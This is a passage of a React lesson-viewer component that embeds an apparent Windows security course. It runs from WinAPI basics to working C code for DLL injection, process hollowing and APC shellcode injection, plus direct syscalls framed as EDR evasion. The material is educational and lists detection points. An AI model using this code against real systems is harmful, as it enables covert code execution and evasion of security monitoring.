import { Card } from "@/components/ui/card";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Badge } from "@/components/ui/badge";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { BookOpen, Lightbulb, AlertTriangle, Code, Sparkles, CheckCircle2, Brain, Target, FileText, Layers } from "lucide-react";

interface LessonViewerProps {
  moduleId: string;
}

const LessonViewer = ({ moduleId }: LessonViewerProps) => {
  const lessons: Record<string, any> = {
    fundamentals: {
      title: "C/C++ WinAPI Fundamentals",
      description: "Master the foundational concepts of Windows systems programming",
      sections: [
        {
          type: "intro",
          content: `This module establishes your foundation in Windows systems programming. You'll understand how Windows manages resources, why Microsoft created specific data types, and how to properly interact with the operating system through its API.`
        },
        {
          title: "Understanding Windows Architecture",
          content: `Windows operates on a layered architecture model that separates user-mode applications from the kernel. This separation is crucial for system stability and security.

**User Mode vs Kernel Mode:**
User-mode applications cannot directly access hardware or system memory. Instead, they must request services through the Windows API, which then transitions to kernel mode to perform privileged operations.

**The Windows API Hierarchy:**
• Win32 API (kernel32.dll, user32.dll, gdi32.dll)
• Native API (ntdll.dll)
• System Service Dispatcher
• Kernel (ntoskrnl.exe)`,
          tip: `Understanding this hierarchy is essential - security tools often hook at different levels to monitor or modify behavior.`,
          concepts: [
            { label: "User Mode", explanation: "Ring 3 - Limited access, where normal applications run. Cannot directly access hardware." },
            { label: "Kernel Mode", explanation: "Ring 0 - Full system access, where drivers and the OS kernel operate." },
            { label: "System Call", explanation: "The transition mechanism from user mode to kernel mode to request OS services." },
            { label: "Subsystem", explanation: "Windows supports multiple subsystems (Win32, WSL) that provide different APIs." }
          ]
        },
        {
          title: "Windows Data Types - Precision Matters",
          content: `Microsoft defined specific data types to ensure consistent behavior across different compiler implementations and processor architectures.

**Why Standard C Types Aren't Enough:**
The C standard allows 'int' to be 16, 32, or 64 bits depending on the platform. Windows data types guarantee exact sizes:

**Unsigned Integer Types:**
• BYTE (8-bit) - Used for raw binary data, single characters
• WORD (16-bit) - Legacy DOS compatibility, some registry values  
• DWORD (32-bit) - Most common: process IDs, error codes, flags
• QWORD (64-bit) - Large values, 64-bit addresses on x64

**Pointer Types:**
• PVOID - Generic pointer (void*)
• LPVOID - Long pointer to void (same as PVOID on modern Windows)
• SIZE_T - Unsigned integer sized to match pointer width (32 or 64 bits)
• ULONG_PTR - Unsigned long sized to hold a pointer

**String Types:**
• LPSTR - Pointer to ANSI string (char*)
• LPWSTR - Pointer to Unicode string (wchar_t*)
• LPTSTR - Pointer to TCHAR string (Unicode or ANSI based on build)`,
          warning: `Always use SIZE_T for memory sizes and ULONG_PTR for pointer arithmetic. Using DWORD on 64-bit systems will truncate addresses!`,
          example: {
            title: "Type Sizes and Safe Usage",
            description: "Demonstrating proper type usage for cross-platform compatibility:",
            code: `#include <windows.h>
#include <stdio.h>

int main() {
    // Integer types with guaranteed sizes
    BYTE   b = 255;           // 8-bit:  0-255
    WORD   w = 65535;         // 16-bit: 0-65535  
    DWORD  dw = 4294967295;   // 32-bit: 0-4.2B
    
    // Pointer-sized types - CRITICAL for 64-bit
    SIZE_T memSize = 0x10000;     // Safe for VirtualAlloc
    ULONG_PTR addr = (ULONG_PTR)&b; // Safe pointer math
    
    printf("BYTE size:     %zu bytes\\n", sizeof(BYTE));
    printf("DWORD size:    %zu bytes\\n", sizeof(DWORD));
    printf("SIZE_T size:   %zu bytes\\n", sizeof(SIZE_T));
    printf("Pointer size:  %zu bytes\\n", sizeof(PVOID));
    
    // String types
    LPCSTR  ansiStr = "ANSI string";     // const char*
    LPCWSTR wideStr = L"Unicode string"; // const wchar_t*
    
    printf("ANSI: %s\\n", ansiStr);
    wprintf(L"Wide: %s\\n", wideStr);
    
    return 0;
}`,
            language: "c"
          }
        },
        {
          title: "The Handle System - Object Management",
          content: `Windows uses handles as opaque references to kernel objects. This abstraction provides security isolation and allows the kernel to manage resources without exposing internal structures.

**Why Handles Exist:**
• Security: Applications can't directly access kernel memory
• Abstraction: Kernel can change internal structures without breaking apps
• Reference Counting: Kernel tracks how many handles point to an object
• Per-Process: Handle values are only valid within their owning process

**Handle Types:**
Each handle references a specific object type:
• Process handles (PROCESS_ALL_ACCESS, PROCESS_VM_READ, etc.)
• Thread handles (THREAD_QUERY_INFORMATION, etc.)
• File handles (GENERIC_READ, GENERIC_WRITE)
• Registry key handles
• Event, mutex, semaphore handles

**The Handle Table:**
Each process has a private handle table that maps handle values to kernel object pointers. Handle values are indices into this table, multiplied by 4.`,
          concepts: [
            { label: "INVALID_HANDLE_VALUE", explanation: "-1 cast to HANDLE. Returned by CreateFile on failure." },
            { label: "NULL", explanation: "0. Returned by most other functions on failure (OpenProcess, etc.)." },
            { label: "Pseudo-Handle", explanation: "Special values like GetCurrentProcess() that don't need closing." },
            { label: "Handle Leak", explanation: "Forgetting CloseHandle() causes resource exhaustion over time." }
          ],
          example: {
            title: "Proper Handle Management",
            code: `#include <windows.h>
#include <stdio.h>

// RAII-style handle wrapper concept
void DemonstrateHandles() {
    HANDLE hProcess = NULL;
    HANDLE hFile = INVALID_HANDLE_VALUE;
    
    // Opening a process - returns NULL on failure
    hProcess = OpenProcess(
        PROCESS_QUERY_LIMITED_INFORMATION,
        FALSE,
        GetCurrentProcessId()
    );
    
    if (hProcess == NULL) {
        printf("[-] OpenProcess failed: %lu\\n", GetLastError());
        goto cleanup;
    }
    printf("[+] Process handle: 0x%p\\n", hProcess);
    
    // Opening a file - returns INVALID_HANDLE_VALUE on failure
    hFile = CreateFileW(
        L"C:\\\\Windows\\\\System32\\\\kernel32.dll",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFile failed: %lu\\n", GetLastError());
        goto cleanup;
    }
    
    // Get file size using handle
    LARGE_INTEGER fileSize;
    if (GetFileSizeEx(hFile, &fileSize)) {
        printf("[+] kernel32.dll size: %lld bytes\\n", fileSize.QuadPart);
    }

cleanup:
    // ALWAYS close handles in reverse order of acquisition
    if (hFile != INVALID_HANDLE_VALUE) {
        CloseHandle(hFile);
    }
    if (hProcess != NULL) {
        CloseHandle(hProcess);
    }
}`,
            language: "c"
          },
          warning: `Different functions return different invalid values! CreateFile returns INVALID_HANDLE_VALUE (-1), while OpenProcess returns NULL (0). Always check the documentation.`
        },
        {
          title: "Error Handling - GetLastError() Deep Dive",
          content: `Windows API functions communicate failure through return values and a thread-local error code retrievable via GetLastError().

**The Error Model:**
1. Function returns a failure indicator (NULL, FALSE, INVALID_HANDLE_VALUE, -1)
2. GetLastError() returns the specific error code
3. Error codes are DWORD values defined in winerror.h

**Critical Rules:**
• Call GetLastError() IMMEDIATELY after the failed function
• Any subsequent Windows API call may overwrite the error code
• Some functions (like CreateFile with CREATE_ALWAYS) set error codes even on success

**Common Error Codes:**
• ERROR_SUCCESS (0) - Operation completed successfully
• ERROR_FILE_NOT_FOUND (2) - File does not exist
• ERROR_ACCESS_DENIED (5) - Insufficient privileges
• ERROR_INVALID_HANDLE (6) - Handle is invalid or closed
• ERROR_NOT_ENOUGH_MEMORY (8) - Memory allocation failed
• ERROR_INVALID_PARAMETER (87) - Bad argument passed`,
          example: {
            title: "Comprehensive Error Handling",
            code: `#include <windows.h>
#include <stdio.h>

void PrintWindowsError(LPCSTR operation) {
    DWORD errorCode = GetLastError();
    LPWSTR messageBuffer = NULL;
    
    // Convert error code to human-readable message
    DWORD size = FormatMessageW(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | 
        FORMAT_MESSAGE_FROM_SYSTEM |
        FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        errorCode,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPWSTR)&messageBuffer,
        0,
        NULL
    );
    
    printf("[-] %s failed\\n", operation);
    printf("    Error Code: %lu (0x%08lX)\\n", errorCode, errorCode);
    
    if (messageBuffer) {
        wprintf(L"    Message: %s", messageBuffer);
        LocalFree(messageBuffer);
    }
}

int main() {
    // Attempt to open non-existent file
    HANDLE hFile = CreateFileW(
        L"C:\\\\ThisFileDoesNotExist.txt",
        GENERIC_READ, 0, NULL,
        OPEN_EXISTING, 0, NULL
    );
    
    if (hFile == INVALID_HANDLE_VALUE) {
        PrintWindowsError("CreateFile");
    }
    
    // Attempt to open protected process
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        4  // System process PID
    );
    
    if (hProcess == NULL) {
        PrintWindowsError("OpenProcess(System)");
    }
    
    return 0;
}`,
            language: "c"
          },
          tip: `Use SetLastError(0) before calling a function if you need to distinguish between "function succeeded" and "function failed with ERROR_SUCCESS".`
        }
      ]
    },
    "windows-internals": {
      title: "Windows Internals & Architecture",
      description: "Deep dive into Windows architecture, process structures, and memory management",
      sections: [
        {
          type: "intro",
          content: `This module explores Windows internals - the structures and mechanisms that the operating system uses to manage processes, memory, and security. Understanding these concepts is essential for advanced security research, malware analysis, and exploit development.`
        },
        {
          title: "Process Architecture - Deep Dive",
          content: `A Windows process is more than just running code - it's a complex container managed by the kernel with numerous internal structures.

**Process Components:**
• Private Virtual Address Space (user-mode: 0 to 0x7FFFFFFFFFFF on x64)
• Handle table for kernel objects
• Access token defining security context
• Private working set (physical memory pages)
• One or more threads

**Key Process Structures:**
1. **EPROCESS** (Kernel Mode) - Executive Process Block
   - Contains process accounting, security info, handle table pointer
   - Linked list connects all processes for enumeration

2. **PEB** (User Mode) - Process Environment Block
   - Located at a fixed offset from TEB (gs:[0x60] on x64)
   - Contains image base, loader data (loaded DLLs), process parameters
   - Frequently accessed for process introspection

3. **KPROCESS** - Kernel Process Block
   - Embedded within EPROCESS
   - Contains scheduling information, processor affinity`,
          concepts: [
            { label: "EPROCESS", explanation: "Kernel structure containing all process management data. Not directly accessible from user mode." },
            { label: "PEB", explanation: "User-mode structure at gs:[0x60]. Contains DLL list, image base, environment variables." },
            { label: "VAD Tree", explanation: "Virtual Address Descriptor tree tracks all memory allocations in the process." },
            { label: "Working Set", explanation: "The set of physical memory pages currently mapped for the process." }
          ],
          example: {
            title: "Reading PEB Information",
            description: "Accessing the Process Environment Block for introspection:",
            code: `#include <windows.h>
#include <winternl.h>
#include <stdio.h>

// PEB structure (partial - defined in winternl.h)
typedef struct _PEB_FULL {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PVOID Ldr;  // PEB_LDR_DATA*
    PVOID ProcessParameters;
    PVOID Reserved4[3];
    PVOID AtlThunkSListPtr;
    PVOID Reserved5;
    ULONG Reserved6;
    PVOID Reserved7;
    ULONG Reserved8;
    ULONG AtlThunkSListPtr32;
    PVOID Reserved9[45];
    BYTE Reserved10[96];
    PVOID PostProcessInitRoutine;
    BYTE Reserved11[128];
    PVOID Reserved12[1];
    ULONG SessionId;
} PEB_FULL;

int main() {
    // Method 1: NtQueryInformationProcess
    PROCESS_BASIC_INFORMATION pbi;
    ULONG returnLength;
    
    NTSTATUS status = NtQueryInformationProcess(
        GetCurrentProcess(),
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        &returnLength
    );
    
    if (NT_SUCCESS(status)) {
        PEB* peb = pbi.PebBaseAddress;
        printf("[+] PEB Address: 0x%p\\n", peb);
        printf("[+] ImageBase:   0x%p\\n", peb->Reserved3[1]);
        printf("[+] Being Debugged: %s\\n", 
               peb->BeingDebugged ? "Yes" : "No");
    }
    
    // Method 2: Direct TEB access (x64)
    // PEB* peb = (PEB*)__readgsqword(0x60);
    
    return 0;
}`,
            language: "c"
          }
        },
        {
          title: "Thread Structures and TEB",
          content: `Threads are the actual execution units within a process. Each thread has its own stack, register context, and Thread Environment Block.

**Thread Components:**
• Stack (user-mode and kernel-mode stacks)
• Context (CPU registers: RIP, RSP, RAX, etc.)
• Thread Environment Block (TEB)
• Thread-Local Storage (TLS)
• Exception handling chain

**TEB Structure (Thread Environment Block):**
The TEB is located at gs:[0] on x64 and contains:
• Stack limits (base and limit)
• PEB pointer at offset 0x60
• Thread ID at offset 0x48
• Last error value at offset 0x68
• TLS array pointer

**Accessing TEB:**
• x64: gs register points to TEB
• x86: fs register points to TEB
• NtCurrentTeb() returns TEB pointer`,
          example: {
            title: "TEB Access and Thread Information",
            code: `#include <windows.h>
#include <stdio.h>

// TEB offsets for x64
#define TEB_SELF_OFFSET           0x30
#define TEB_PEB_OFFSET            0x60
#define TEB_TID_OFFSET            0x48
#define TEB_STACK_BASE_OFFSET     0x08
#define TEB_STACK_LIMIT_OFFSET    0x10
#define TEB_LAST_ERROR_OFFSET     0x68

int main() {
    // Direct TEB access via GS segment
    PVOID pTeb = (PVOID)__readgsqword(TEB_SELF_OFFSET);
    PVOID pPeb = (PVOID)__readgsqword(TEB_PEB_OFFSET);
    DWORD tid = (DWORD)__readgsqword(TEB_TID_OFFSET);
    
    PVOID stackBase = (PVOID)__readgsqword(TEB_STACK_BASE_OFFSET);
    PVOID stackLimit = (PVOID)__readgsqword(TEB_STACK_LIMIT_OFFSET);
    
    printf("[+] TEB Address:  0x%p\\n", pTeb);
    printf("[+] PEB Address:  0x%p\\n", pPeb);
    printf("[+] Thread ID:    %lu\\n", tid);
    printf("[+] Stack Base:   0x%p\\n", stackBase);
    printf("[+] Stack Limit:  0x%p\\n", stackLimit);
    printf("[+] Stack Size:   %llu KB\\n", 
        ((ULONG_PTR)stackBase - (ULONG_PTR)stackLimit) / 1024);
    
    // Verify with API
    printf("\\n[*] Verification via API:\\n");
    printf("    GetCurrentThreadId(): %lu\\n", GetCurrentThreadId());
    
    return 0;
}`,
            language: "c"
          },
          tip: `The TEB is crucial for shellcode - it provides access to the PEB, which leads to kernel32.dll and its exports like GetProcAddress and LoadLibrary.`
        },
        {
          title: "Virtual Memory Architecture",
          content: `Windows implements a virtual memory system that provides each process with its own isolated address space, enabling memory protection and efficient resource utilization.

**Address Space Layout (x64):**
• 0x00000000\`00000000 - 0x00007FFF\`FFFFFFFF: User space (128TB)
• 0xFFFF8000\`00000000 - 0xFFFFFFFF\`FFFFFFFF: Kernel space (128TB)

**Memory States:**
• FREE - Not allocated, not accessible
• RESERVED - Address range claimed but no physical storage
• COMMITTED - Physical storage (RAM or page file) backing the range

**Page Protections:**
• PAGE_NOACCESS - No access allowed
• PAGE_READONLY - Read only
• PAGE_READWRITE - Read/write, no execute
• PAGE_EXECUTE_READ - Read and execute, common for code
• PAGE_EXECUTE_READWRITE - Full access (suspicious for security tools)

**Memory Types:**
• Private - Process-private pages (VirtualAlloc)
• Mapped - File-backed or shared memory
• Image - Executable/DLL mappings`,
          warning: `PAGE_EXECUTE_READWRITE is heavily monitored by security tools. Modern exploits allocate RW, write shellcode, then change to RX using VirtualProtect.`,
          example: {
            title: "Memory Region Enumeration",
            code: `#include <windows.h>
#include <stdio.h>

const char* GetProtectionString(DWORD protect) {
    switch (protect & 0xFF) {
        case PAGE_NOACCESS:          return "---";
        case PAGE_READONLY:          return "R--";
        case PAGE_READWRITE:         return "RW-";
        case PAGE_EXECUTE:           return "--X";
        case PAGE_EXECUTE_READ:      return "R-X";
        case PAGE_EXECUTE_READWRITE: return "RWX";
        default:                     return "???";
    }
}

const char* GetTypeString(DWORD type) {
    switch (type) {
        case MEM_IMAGE:   return "Image";
        case MEM_MAPPED:  return "Mapped";
        case MEM_PRIVATE: return "Private";
        default:          return "Unknown";
    }
}

void EnumerateMemory(HANDLE hProcess) {
    MEMORY_BASIC_INFORMATION mbi;
    LPVOID address = NULL;
    
    printf("%-18s %-10s %-6s %-8s %-10s\\n",
           "Address", "Size", "Prot", "Type", "State");
    printf("─────────────────────────────────────────────────\\n");
    
    while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi))) {
        if (mbi.State == MEM_COMMIT) {
            printf("0x%016llX %-10llu %-6s %-8s Committed\\n",
                (ULONGLONG)mbi.BaseAddress,
                (ULONGLONG)mbi.RegionSize / 1024,
                GetProtectionString(mbi.Protect),
                GetTypeString(mbi.Type));
        }
        
        address = (LPBYTE)mbi.BaseAddress + mbi.RegionSize;
    }
}

int main() {
    printf("[*] Enumerating current process memory...\\n\\n");
    EnumerateMemory(GetCurrentProcess());
    return 0;
}`,
            language: "c"
          }
        },
        {
          title: "DLL Loading and the Loader",
          content: `The Windows loader (ntdll.dll) is responsible for mapping executables and their dependencies into memory. Understanding this process is crucial for techniques like DLL injection and reflective loading.

**Load Order:**
1. Create process address space
2. Map ntdll.dll (always first)
3. Initialize the loader
4. Parse PE import table
5. Load dependent DLLs recursively
6. Call DllMain for each loaded DLL
7. Call executable entry point

**Key Loader Structures (in PEB):**
• PEB_LDR_DATA - Contains linked lists of loaded modules
• LDR_DATA_TABLE_ENTRY - Per-module information
  - BaseDllName: Module name
  - DllBase: Load address
  - EntryPoint: DllMain address
  - SizeOfImage: Module size in memory

**Module Lists:**
Three doubly-linked lists in different orders:
• InLoadOrderModuleList - Order modules were loaded
• InMemoryOrderModuleList - Order by memory address
• InInitializationOrderModuleList - DllMain call order`,
          example: {
            title: "Walking the Loaded Module List",
            code: `#include <windows.h>
#include <winternl.h>
#include <stdio.h>

typedef struct _LDR_DATA_TABLE_ENTRY_FULL {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    // ... more fields
} LDR_DATA_TABLE_ENTRY_FULL;

void WalkModuleList() {
    // Get PEB
    PEB* peb = (PEB*)__readgsqword(0x60);
    
    // Get loader data
    PEB_LDR_DATA* ldr = (PEB_LDR_DATA*)peb->Ldr;
    
    // Walk InMemoryOrderModuleList
    LIST_ENTRY* head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY* current = head->Flink;
    
    printf("[*] Loaded Modules (Memory Order):\\n\\n");
    printf("%-18s %-10s %s\\n", "Base Address", "Size", "Name");
    printf("──────────────────────────────────────────────\\n");
    
    while (current != head) {
        // Entry is offset by InMemoryOrderLinks
        LDR_DATA_TABLE_ENTRY_FULL* entry = CONTAINING_RECORD(
            current,
            LDR_DATA_TABLE_ENTRY_FULL,
            InMemoryOrderLinks
        );
        
        wprintf(L"0x%016llX %-10lu %wZ\\n",
            (ULONGLONG)entry->DllBase,
            entry->SizeOfImage,
            &entry->BaseDllName);
        
        current = current->Flink;
    }
}

int main() {
    WalkModuleList();
    return 0;
}`,
            language: "c"
          },
          tip: `Security tools monitor the PEB module lists. Techniques like "unlinking" remove modules from these lists to hide loaded DLLs, though this can cause crashes during exception handling.`
        }
      ]
    },
    "process-injection": {
      title: "Process Injection Techniques",
      description: "Advanced memory manipulation and code execution in remote processes",
      sections: [
        {
          type: "intro",
          content: `Process injection allows code execution in the context of another process. This is used legitimately for debugging and monitoring, but also by malware to evade detection, gain privileges, or persist. Understanding these techniques is essential for both offensive security and detection engineering.`
        },
        {
          title: "Classic DLL Injection",
          content: `The most straightforward injection technique: force a target process to load a malicious DLL using CreateRemoteThread and LoadLibrary.

**The Process:**
1. Open target process with appropriate access rights
2. Allocate memory in target for DLL path string
3. Write DLL path to allocated memory
4. Get address of LoadLibraryW in kernel32.dll
5. Create remote thread starting at LoadLibraryW with DLL path as argument
6. DLL's DllMain executes in target process context

**Required Access Rights:**
• PROCESS_CREATE_THREAD - Create thread in target
• PROCESS_VM_OPERATION - VirtualAllocEx
• PROCESS_VM_WRITE - WriteProcessMemory
• PROCESS_QUERY_INFORMATION - Query process info

**Detection Points:**
• CreateRemoteThread on foreign process
• VirtualAllocEx with RWX permissions
• WriteProcessMemory to executable regions
• Unsigned DLL loaded from unusual location`,
          warning: `This technique is heavily monitored. Modern EDR solutions hook CreateRemoteThread and monitor for cross-process memory operations.`,
          example: {
            title: "DLL Injection Implementation",
            code: `#include <windows.h>
#include <stdio.h>

BOOL InjectDLL(DWORD pid, LPCWSTR dllPath) {
    BOOL success = FALSE;
    HANDLE hProcess = NULL;
    LPVOID remotePath = NULL;
    HANDLE hThread = NULL;
    
    SIZE_T pathSize = (wcslen(dllPath) + 1) * sizeof(WCHAR);
    
    // Step 1: Open target process
    hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | 
        PROCESS_VM_OPERATION | 
        PROCESS_VM_WRITE,
        FALSE,
        pid
    );
    
    if (!hProcess) {
        printf("[-] OpenProcess failed: %lu\\n", GetLastError());
        goto cleanup;
    }
    printf("[+] Opened process: %lu\\n", pid);
    
    // Step 2: Allocate memory for DLL path
    remotePath = VirtualAllocEx(
        hProcess,
        NULL,
        pathSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE  // Only RW needed for string
    );
    
    if (!remotePath) {
        printf("[-] VirtualAllocEx failed: %lu\\n", GetLastError());
        goto cleanup;
    }
    printf("[+] Allocated remote memory: 0x%p\\n", remotePath);
    
    // Step 3: Write DLL path
    if (!WriteProcessMemory(hProcess, remotePath, dllPath, pathSize, NULL)) {
        printf("[-] WriteProcessMemory failed: %lu\\n", GetLastError());
        goto cleanup;
    }
    printf("[+] Wrote DLL path to target\\n");
    
    // Step 4: Get LoadLibraryW address
    // kernel32.dll is loaded at same address in all processes
    LPVOID loadLibrary = GetProcAddress(
        GetModuleHandleW(L"kernel32.dll"),
        "LoadLibraryW"
    );
    printf("[+] LoadLibraryW: 0x%p\\n", loadLibrary);
    
    // Step 5: Create remote thread
    hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)loadLibrary,
        remotePath,
        0,
        NULL
    );
    
    if (!hThread) {
        printf("[-] CreateRemoteThread failed: %lu\\n", GetLastError());
        goto cleanup;
    }
    printf("[+] Created remote thread!\\n");
    
    // Wait for DLL to load
    WaitForSingleObject(hThread, 5000);
    success = TRUE;

cleanup:
    if (hThread) CloseHandle(hThread);
    // Note: Don't free remotePath - it's needed by the DLL
    if (hProcess) CloseHandle(hProcess);
    
    return success;
}`,
            language: "c"
          }
        },
        {
          title: "Process Hollowing (RunPE)",
          content: `Process hollowing creates a suspended legitimate process, unmaps its original code, and replaces it with malicious code - inheriting the victim's appearance and potentially its privileges.

**The Process:**
1. Create target process in SUSPENDED state
2. Read target's PEB to get image base
3. Unmap the original executable using NtUnmapViewOfSection
4. Allocate new memory at the original (or new) base address
5. Write malicious PE (headers + sections)
6. Update PEB's ImageBaseAddress if base changed
7. Set thread context (RCX = entry point on x64)
8. Resume the thread

**Advantages:**
• Process appears legitimate (name, command line)
• Inherits parent-child relationship
• May bypass application whitelisting
• Memory forensics shows hollowed sections

**Detection:**
• PEB ImageBase doesn't match memory content
• Memory regions marked as MEM_IMAGE but not backed by file
• Entropy analysis of executable sections`,
          concepts: [
            { label: "Suspended Process", explanation: "Created with CREATE_SUSPENDED flag - main thread doesn't execute until resumed." },
            { label: "NtUnmapViewOfSection", explanation: "Native API to unmap memory regions, including the main executable image." },
            { label: "Image Base", explanation: "The address where the PE is loaded. Usually 0x140000000 for 64-bit executables." },
            { label: "Thread Context", explanation: "CPU register state. Entry point address goes in RCX (x64) or EAX (x86)." }
          ],
          example: {
            title: "Process Hollowing Skeleton",
            code: `#include <windows.h>
#include <winternl.h>
#include <stdio.h>

// NtUnmapViewOfSection typedef
typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
);

BOOL HollowProcess(LPCWSTR targetPath, LPVOID payload, SIZE_T payloadSize) {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    PROCESS_BASIC_INFORMATION pbi;
    ULONG returnLength;
    
    // Step 1: Create suspended process
    if (!CreateProcessW(
        targetPath, NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
        NULL, NULL, &si, &pi
    )) {
        printf("[-] CreateProcess failed: %lu\\n", GetLastError());
        return FALSE;
    }
    printf("[+] Created suspended process: %lu\\n", pi.dwProcessId);
    
    // Step 2: Get PEB address
    NtQueryInformationProcess(
        pi.hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        &returnLength
    );
    
    // Step 3: Read ImageBaseAddress from PEB
    PVOID imageBase;
    ReadProcessMemory(
        pi.hProcess,
        (PBYTE)pbi.PebBaseAddress + 0x10, // ImageBaseAddress offset
        &imageBase,
        sizeof(imageBase),
        NULL
    );
    printf("[+] Original ImageBase: 0x%p\\n", imageBase);
    
    // Step 4: Unmap original image
    pNtUnmapViewOfSection NtUnmapViewOfSection = 
        (pNtUnmapViewOfSection)GetProcAddress(
            GetModuleHandleW(L"ntdll.dll"),
            "NtUnmapViewOfSection"
        );
    
    NtUnmapViewOfSection(pi.hProcess, imageBase);
    printf("[+] Unmapped original image\\n");
    
    // Step 5: Allocate and write payload
    // ... (PE parsing and writing sections)
    
    // Step 6: Update thread context and resume
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    // ctx.Rcx = newEntryPoint;  // x64
    SetThreadContext(pi.hThread, &ctx);
    
    ResumeThread(pi.hThread);
    printf("[+] Process hollowing complete!\\n");
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;
}`,
            language: "c"
          }
        },
        {
          title: "APC Injection",
          content: `Asynchronous Procedure Calls (APCs) allow code execution in the context of a specific thread. APC injection queues a function to execute when the target thread enters an alertable wait state.

**How APCs Work:**
• Each thread has an APC queue (user-mode and kernel-mode)
• APCs execute when thread enters "alertable wait" (SleepEx, WaitForSingleObjectEx, etc.)
• QueueUserAPC adds a function to a thread's APC queue

**Injection Process:**
1. Allocate executable memory in target process
2. Write shellcode to allocated memory
3. Find or enumerate target threads
4. Queue APC pointing to shellcode for target thread(s)
5. Wait for thread to become alertable (or queue to all threads)

**Early Bird Variant:**
• Create suspended process
• Queue APC to main thread before it starts
• Resume thread - APC executes before main() runs
• Bypasses some security hooks not yet installed`,
          tip: `APC injection is stealthier than CreateRemoteThread because no new thread is created. The code runs in an existing thread's context.`,
          example: {
            title: "APC Injection to All Threads",
            code: `#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

BOOL InjectViaAPC(DWORD pid, LPVOID shellcode, SIZE_T size) {
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
        FALSE, pid
    );
    if (!hProcess) return FALSE;
    
    // Allocate RWX memory
    LPVOID remoteCode = VirtualAllocEx(
        hProcess, NULL, size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (!remoteCode) {
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // Write shellcode
    WriteProcessMemory(hProcess, remoteCode, shellcode, size, NULL);
    printf("[+] Wrote shellcode at 0x%p\\n", remoteCode);
    
    // Enumerate threads and queue APC to all
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = { sizeof(te) };
    
    if (Thread32First(hSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                HANDLE hThread = OpenThread(
                    THREAD_SET_CONTEXT,
                    FALSE,
                    te.th32ThreadID
                );
                
                if (hThread) {
                    // Queue APC
                    if (QueueUserAPC(
                        (PAPCFUNC)remoteCode,
                        hThread,
                        0  // APC parameter
                    )) {
                        printf("[+] Queued APC to thread %lu\\n", 
                               te.th32ThreadID);
                    }
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hSnapshot, &te));
    }
    
    CloseHandle(hSnapshot);
    CloseHandle(hProcess);
    return TRUE;
}`,
            language: "c"
          }
        }
      ]
    },
    syscalls: {
      title: "Direct Syscalls & Native API",
      description: "Bypassing user-mode hooks through direct kernel transitions",
      sections: [
        {
          type: "intro",
          content: `Modern security tools hook Windows API functions in user-mode DLLs (kernel32, ntdll) to monitor process behavior. Direct syscalls bypass these hooks by transitioning directly to kernel mode, making detection significantly harder.`
        },
        {
          title: "Understanding System Calls",
          content: `A system call (syscall) is the mechanism for user-mode code to request services from the kernel.

**The Syscall Mechanism (x64):**
1. System Service Number (SSN) loaded into RAX
2. Arguments placed in RCX, RDX, R8, R9, then stack
3. Execute 'syscall' instruction
4. CPU transitions to kernel mode
5. KiSystemCall64 dispatches to appropriate kernel function
6. Result returned in RAX

**Why Syscalls Bypass Hooks:**
• EDR hooks are placed in ntdll.dll functions
• Direct syscalls skip ntdll entirely
• The 'syscall' instruction goes directly to kernel
• No user-mode code is executed except your own

**NTDLL Function Layout:**
Each NT function in ntdll.dll follows a pattern:
1. mov r10, rcx
2. mov eax, <SSN>
3. syscall
4. ret

Security tools replace this with a JMP to their hook.`,
          concepts: [
            { label: "SSN", explanation: "System Service Number - index into kernel's service table. Changes between Windows versions." },
            { label: "syscall", explanation: "CPU instruction that triggers ring 3 to ring 0 transition on x64." },
            { label: "SSDT", explanation: "System Service Descriptor Table - kernel table mapping SSNs to function addresses." },
            { label: "Hook", explanation: "Modification of function prologue to redirect execution, typically JMP to monitoring code." }
          ],
          example: {
            title: "Basic Direct Syscall (Assembly)",
            code: `; Direct syscall for NtAllocateVirtualMemory
; SSN varies by Windows version!

section .text
global SysNtAllocateVirtualMemory

SysNtAllocateVirtualMemory:
    mov r10, rcx              ; First param to r10 (convention)
    mov eax, 0x18             ; SSN for NtAllocateVirtualMemory (Win10 1909)
    syscall                   ; Transition to kernel
    ret

; C declaration:
; extern NTSTATUS SysNtAllocateVirtualMemory(
;     HANDLE ProcessHandle,     // rcx -> r10
;     PVOID* BaseAddress,       // rdx
